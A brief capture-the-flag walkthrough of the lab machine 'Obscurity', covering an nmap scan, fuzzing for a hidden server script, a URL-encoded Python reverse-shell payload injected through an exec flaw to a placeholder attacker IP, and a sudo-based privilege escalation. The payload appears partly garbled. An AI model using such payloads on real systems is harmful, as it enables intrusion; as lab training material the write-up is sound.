# Obscurity walkthrough

Machine ip: 10.10.10.168

Nmap output:

```
root@kali# nmap -p- --min-rate 10000  10.10.10.168
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-30 14:05 EST
Nmap scan report for 10.10.10.168
Host is up (0.035s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   closed http
8080/tcp open   http-proxy
9000/tcp closed cslistener

```

## User

At port 8080 there is a website in which we can get some information about the webserver under the hood.

Given I know the name of the file I’m looking for, that it’s in a “secret development directory”, and I can’t count on standard tools to identify the directory name, I’ll use wfuzz, targeting the url http://10.10.10.168:8080/FUZZ/SuperSecureServer.py.

Having found the directory, I can get the server source from that url, http://10.10.10.168:8080/develop/SuperSecureServer.py.

In a quick scan over the code, you can see an exec badly handled(with a comment that also highlights it)

On this page you can find a cheat sheet with all the ways to get reverse shell:
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

We make this request in the browser setting up our ip:
```
http://10.10.10.168:8080/index.html';import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,soc
ket.SOCK_STREAM);s.connect((%22OURIP%22, 4444)); os.dup2 (s.fileno (), 0);% 20os.dup2 (s.fileno
(), 1);% 20os.dup2 (s.fileno (), 2); p = subprocess.call ([22% / bin / sh% 22% 22% 22-i]); x = 'x
```

After that, on the terminal listening with nc i got a shell as www-data.

In the home folder there are a couple of files that help us finding the decrypting key for gettin passwordreminer cleat again and after thet we can get a shell as robert and
take the user flag

## Root

ow as robert I can access the BetterSSH directory to find BetterSSH.py. this file can be executed by robert as root acording to sudo -l
output:
```
robert@obscure:~/BetterSSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

Analyzing the script makes me understand that i need to create the /tmp/SSH folder and then i can run the script as sudo, authenticate myself as Robert and get
a root homemade shell. After that we can get the root flag
